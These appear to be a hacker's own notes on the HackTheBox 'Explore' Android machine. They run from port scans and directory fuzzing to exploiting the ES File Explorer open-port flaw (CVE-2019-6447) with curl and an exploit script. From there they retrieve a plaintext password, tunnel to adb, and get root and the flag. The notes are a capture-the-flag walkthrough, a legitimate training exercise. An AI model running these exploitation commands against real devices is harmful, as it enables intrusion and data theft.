@@ -1,0 +1,235 @@
+Flag the Android
+
+Scan port
+vi /etc/hosts
+10.10.10.247 explore.htb
+
+https://github.com/RustScan/RustScan/releases
+rustscan -a explore.htb 
+.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
+| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
+| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
+`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
+The Modern Day Port Scanner.
+________________________________________
+: https://discord.gg/GFrQsGy           :
+: https://github.com/RustScan/RustScan :
+ --------------------------------------
+😵 https://admin.tryhackme.com
+
+[~] The config file is expected to be at "/root/.rustscan.toml"
+[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
+[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
+
+Open 10.10.10.247:2222
+Open 10.10.10.247:35997
+Open 10.10.10.247:59777
+
+
+PORT      STATE SERVICE      REASON
+2222/tcp  open  EtherNetIP-1 syn-ack ttl 63
+35997/tcp open  unknown      syn-ack ttl 63
+59777/tcp open  unknown      syn-ack ttl 63
+
+
+ nmap -sSVC -p222,35997,59777 --script=vuln explore.htb
+  nmap -sSVC -p222,35997,59777 -A -vv explore.htb
+ nmap -sSVC -A -p- -vv 10.10.10.247
+ ,...
+42135 open es file explore
+....
+
+ffuf -u http://explore.htb:59777/FUZZ -w /usr/share/wordlists/dirb/big.txt -t 200 -c
+
+acct                    [Status: 301, Size: 65, Words: 3, Lines: 1]
+bin                     [Status: 301, Size: 63, Words: 3, Lines: 1]
+cache                   [Status: 301, Size: 67, Words: 3, Lines: 1]
+config                  [Status: 301, Size: 69, Words: 3, Lines: 1]
+d                       [Status: 301, Size: 59, Words: 3, Lines: 1]
+data                    [Status: 301, Size: 65, Words: 3, Lines: 1]
+dev                     [Status: 301, Size: 63, Words: 3, Lines: 1]
+etc                     [Status: 301, Size: 63, Words: 3, Lines: 1]
+init                    [Status: 403, Size: 31, Words: 4, Lines: 1]
+lib                     [Status: 301, Size: 63, Words: 3, Lines: 1]
+mnt                     [Status: 301, Size: 63, Words: 3, Lines: 1]
+oem                     [Status: 301, Size: 63, Words: 3, Lines: 1]
+proc                    [Status: 301, Size: 65, Words: 3, Lines: 1]
+product                 [Status: 301, Size: 71, Words: 3, Lines: 1]
+sbin                    [Status: 301, Size: 65, Words: 3, Lines: 1]
+storage                 [Status: 301, Size: 71, Words: 3, Lines: 1]
+sys                     [Status: 301, Size: 63, Words: 3, Lines: 1]
+system                  [Status: 301, Size: 69, Words: 3, Lines: 1]
+vendor                  [Status: 301, Size: 69, Words: 3, Lines: 1]
+:: Progress: [20469/20469] :: Job [1/1] :: 231 req/sec :: Duration: [0:02:41] :: Errors: 275 ::
+
+
+dirsearch http://explore.htb:59777
+dirsearch -u http://explore.htb:59777
+
+  _|. _ _  _  _  _ _|_    v0.4.1
+ (_||| _) (/_(_|| (_| )
+
+Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 30 | Wordlist size: 10877
+
+Output File: /home/gd/.dirsearch/reports/explore.htb/_21-08-10_10-53-48.txt
+
+Error Log: /home/gd/.dirsearch/logs/errors-21-08-10_10-53-48.log
+
+Target: http://explore.htb:59777/
+
+[10:53:49] Starting: 
+[10:53:56] 403 -   48B  - /%2e%2e//google.com
+[10:56:58] 403 -   48B  - /asset..                                                     
+[10:57:04] 301 -   63B  - /bin  ->  /bin/                                                        
+[10:57:04] 403 -   32B  - /bin/
+[10:57:08] 301 -   67B  - /cache  ->  /cache/                                            
+[10:57:08] 403 -   32B  - /cache/                                              
+[10:57:13] 200 -  415KB - /bin/hostname                                                                 
+[10:57:16] 301 -   69B  - /config  ->  /config/                                                         
+[10:57:17] 403 -   32B  - /config/                                      
+[10:57:24] 301 -   59B  - /d  ->  /d/                                                                      
+[10:57:24] 301 -   65B  - /data  ->  /data/                              
+[10:57:24] 403 -   32B  - /data/                                    
+[10:57:24] 403 -   32B  - /data/cache/                           
+[10:57:28] 301 -   63B  - /dev  ->  /dev/                                        
+[10:57:28] 403 -   32B  - /dev/                               
+[10:57:35] 301 -   63B  - /etc  ->  /etc/                                                     
+[10:57:35] 403 -   32B  - /etc/
+[10:57:35] 200 -   56B  - /etc/hosts                                
+[10:57:52] 403 -   31B  - /init/                                                       
+[10:57:54] 403 -   48B  - /javax.faces.resource.../                                     
+[10:57:54] 403 -   48B  - /javax.faces.resource.../WEB-INF/web.xml.jsf                 
+[10:57:58] 301 -   63B  - /lib  ->  /lib/                                     
+[10:57:58] 403 -   32B  - /lib/                               
+[10:58:35] 200 -    0B  - /proc/sys/kernel/core_pattern                     
+[10:58:35] 301 -   71B  - /product  ->  /product/                   
+[10:58:37] 403 -   48B  - /public..                                                       
+[10:58:56] 403 -   48B  - /static..                                                                            
+[10:58:56] 301 -   71B  - /storage  ->  /storage/                   
+[10:58:56] 403 -   32B  - /storage/
+[10:59:00] 301 -   69B  - /system  ->  /system/                                                                 
+[10:59:00] 403 -   32B  - /system/                                        
+[10:59:13] 403 -   32B  - /vendor/                                                                            
+                                                                                                
+Task Completed                         
+
+curl -s http://explore.htb:59777/bin/        
+FORBIDDEN: No directory listing. 
+
+
+google search "59777/tcp port"
+--->https://portswigger.net/daily-swig/android-file-manager-app-exposing-user-data-through-open-port
+---> https://github.com/fs0c131y/ESFileExplorerOpenPortVuln
+
+python3 poc.py --cmd getDeviceInfo --ip 10.10.10.247
+
+
+view 
+test
+
+curl --header "Content-Type: application/json" --request POST --data "{\"command\":\"listFiles\"}" http://explore.htb:59777
+....
+{"name":"sdcard", "time":"4/21/21 02:12:29 AM", "type":"folder", "size":"4.00 KB (4,096 Bytes)", },
+....
+
+curl — header “Content-Type: application/json” — request POST — data ‘{“command”:”listFiles”}’ http://explore.htb:59777/sdcard/DCIM
+
+
+or searchsploit es file explore
+Exploit Title                                                                  |  Path
+-------------------------------------------------------------------------------- ---------------------------------
+ES File Explorer 4.1.9.7.4 - Arbitrary File Read                                | android/remote/50070.py
+iOS iFileExplorer Free - Directory Traversal                                    | ios/remote/16278.py
+....
+
+
+searchsploit -m android/remote/50070.py
+
+python3 50070.py getDeviceInfo 10.10.10.247
+
+==================================================================
+|    ES File Explorer Open Port Vulnerability : CVE-2019-6447    |
+|                Coded By : Nehal a.k.a PwnerSec                 |
+==================================================================
+
+name : VMware Virtual Platform
+ftpRoot : /sdcard
+ftpPort : 3721
+
+
+python3 50070.py listFiles explore.htb
+
+python3 50070.py listPics 10.10.10.247                                                                    1 ⨯
+
+==================================================================
+|    ES File Explorer Open Port Vulnerability : CVE-2019-6447    |
+|                Coded By : Nehal a.k.a PwnerSec                 |
+==================================================================
+
+name : concept.jpg
+time : 4/21/21 02:38:08 AM
+location : /storage/emulated/0/DCIM/concept.jpg
+size : 135.33 KB (138,573 Bytes)
+
+name : anc.png
+time : 4/21/21 02:37:50 AM
+location : /storage/emulated/0/DCIM/anc.png
+size : 6.24 KB (6,392 Bytes)
+
+name : creds.jpg
+time : 4/21/21 02:38:18 AM
+location : /storage/emulated/0/DCIM/creds.jpg
+size : 1.14 MB (1,200,401 Bytes)
+
+name : 224_anc.png
+time : 4/21/21 02:37:21 AM
+location : /storage/emulated/0/DCIM/224_anc.png
+size : 124.88 KB (127,876 Bytes)
+
+--->/storage/emulated/0/DCIM/creds.jpg
+http://explore.htb:59777/storage/emulated/0/DCIM/creds.jpg
+kristi:Kr1sT!5h@Rp3xP10r3!
+
+user: kristi
+pwd: Kr1sT!5h@Rp3xPl0r3!
+ssh kristi@explore.htb
+ss -tulpn
+netstat -tulpn
+...
+5555
+
+https://packetstormsecurity.com/files/163303/ES-File-Explorer-4.1.9.7.4-Arbitrary-File-Read.html
+
+
+curl --header "Content-Type: application/json" --request POST --data "{\"command\":\"listFiles\"}" http://explore.htb:59777
+curl --header "Content-Type: application/json" --request POST --data "{\"command\":\"listFiles\"}" http://explore.htb:59777/sdcard
+
+on my machine
+apt-get install android-tools-adb
+
+use SSH Tunnel to my machine
+ssh -L 1234:localhost:5555 -p 2222 kristi@explore.htb
+Kr1sT!5h@Rp3xPl0r3!
+
+on my machine
+adb connect localhost:1234
+connected to localhost:1234
+adb shell
+adb shell                 
+x86_64:/ $ su                                                                                                    
+:/ # pwd
+/
+# whoami
+root
+# find / -name root.txt 2>/dev/null
+/data/root.txt
+f04fc82b6d49b41c9b08982be59338c5
+
+
+https://ethicalhacs.com/explore-hackthebox-walkthrough/
+https://medium.com/@knownsec404team/analysis-of-es-file-explorer-security-vulnerability-cve-2019-6447-7f34407ed566
+https://sudeepawanigarathne.blogspot.com/2021/06/hackthebox-walkthrough-explore.html
+https://zhuanlan.zhihu.com/p/387239756
+https://fdlucifer.github.io/2021/06/27/explore/
+https://www.0xsakthi.rocks/2021/06/explore-hackthebox-writeupdetailed.html
+
